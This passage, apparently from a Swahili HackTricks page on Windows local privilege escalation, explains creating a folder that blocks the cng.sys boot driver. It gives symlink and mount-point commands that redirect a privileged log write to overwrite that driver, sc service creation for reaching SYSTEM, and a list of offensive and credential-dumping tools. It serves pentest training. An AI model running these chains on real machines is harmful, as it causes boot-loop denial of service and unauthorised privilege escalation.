### Kutoka kwa Uundaji wa Folda Yoyote hadi DoS ya Kudumu

Exploit primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiitengeneza mapema kama folder, Windows hushindwa kupakia driver halisi wakati wa boot.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa boot.
- Huona folder, hushindwa kupata driver halisi, na mfumo hu-crash au boot husimama.
- Hakuna fallback wala recovery bila uingiliaji wa nje (kwa mfano, boot repair au ufikiaji wa disk).

### Kutoka kwenye njia za log/backup zenye privileged access + OM symlinks hadi arbitrary file overwrite / boot DoS

Wakati huduma yenye privileged access huandika logs/exports kwenye njia inayosomwa kutoka kwenye config inayoweza kuandikwa, elekeza upya njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kubadilisha uandishi huo wenye privileged access kuwa arbitrary overwrite (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa iweze kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenda `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye privileged access inayoandika kwenye njia hiyo (log, export, report).

**Mfano wa mnyororo**
1. Soma config ili kubaini mahali pa log panapotumiwa na privileged access, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileges za juu iandike log (kwa mfano, admin achochee "send test SMS"). Sasa maandishi yanaandikwa kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa juu yake (hex/PE parser) ili kuthibitisha corruption; kuwasha upya kunalazimisha Windows kupakia driver iliyoharibiwa kutoka path hiyo → **boot loop DoS**. Hii pia inatumika kwa file yoyote iliyolindwa ambayo service yenye privileges za juu itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa kuna nakala kwenye `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na kuifanya iwe sink ya DoS inayotegemewa kwa data iliyoharibika.



## **From High Integrity to System**

### **New service**

Ikiwa tayari unaendesha process ya High Integrity, **path to SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza service mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza binary ya service, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa kuwa itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye process ya High Integrity unaweza kujaribu **kuwezesha maingizo ya registry ya AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye process ya High Integrity), utaweza **kufungua karibu process yoyote** (isipokuwa protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya process hiyo, na kuunda **process yoyote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM yenye token privileges zote** (_ndiyo, unaweza kupata process za SYSTEM zisizo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kuongeza privileges katika `getsystem`. Mbinu hii inahusisha **kuunda pipe na kisha kuunda/kutumia vibaya service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya client wa pipe (service), na kupata privileges za SYSTEM.\
Ikiwa ungependa [**kujifunza zaidi kuhusu name pipes, soma hapa**](#named-pipe-client-impersonation).\
Ikiwa ungependa kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **ku-hijack dll** inayopakiwa na **process** inayoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa permissions hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation. Zaidi ya hayo, ni rahisi **zaidi kuitekeleza kutoka kwenye process ya high integrity**, kwa kuwa process hiyo itakuwa na **write permissions** kwenye folders zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye mfumo wa ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hujaribu passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofing na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows enumeration ya msingi ya privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta vulnerabilities zinazojulikana za privesc (IMEPITWA NA WAKATI; tumia Watson badala yake)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa mfumo wa ndani **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta vulnerabilities zinazojulikana za privesc (inahitaji ku-compiliwa kwa kutumia VisualStudio) ([**iliyocompiliwa tayari**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchunguza host kutafuta misconfigurations (ni zaidi ya zana ya kukusanya taarifa kuliko ya privesc) (inahitaji ku-compiliwa) **(**[**iliyocompiliwa tayari**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompiliwa tayari inapatikana kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Toleo la PowerUp lililoandikwa kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompiliwa tayari inapatikana kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa kutegemea chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji ku-compili mradi kwa kutumia toleo sahihi la .NET ([tazama hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kupandisha privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - mwongozo wa haraka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Local Privilege Escalation ya Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo Kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha ya ukaguzi ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Ulaghai wa barua pepe kwa macro ya Word VBA kupitia SMTP → kusimbua credentials za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya kwenye Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Athari ya usalama wa mfumo wa faili yenye privileges katika mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za kupima Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia Vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha ya ukaguzi ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na Masharti ya Mbio ya Kernel ya DirectX kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja Kuwatawala Wote: Primitive kamili ya kusoma/kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia Vibaya Ufutaji wa Faili za Kiholela Kupandisha Privilege na Mbinu Nyingine Bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya siku moja](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya picha yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha Seva za Usasishaji za Biashara kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha Seva za Usasishaji za Biashara kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation kupitia Kufuta Folda ya Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kufuatilia Hatua Zako Kurudi hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Ushauri kuhusu Privilege Escalation kupitia nafasi za shared-memory za Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
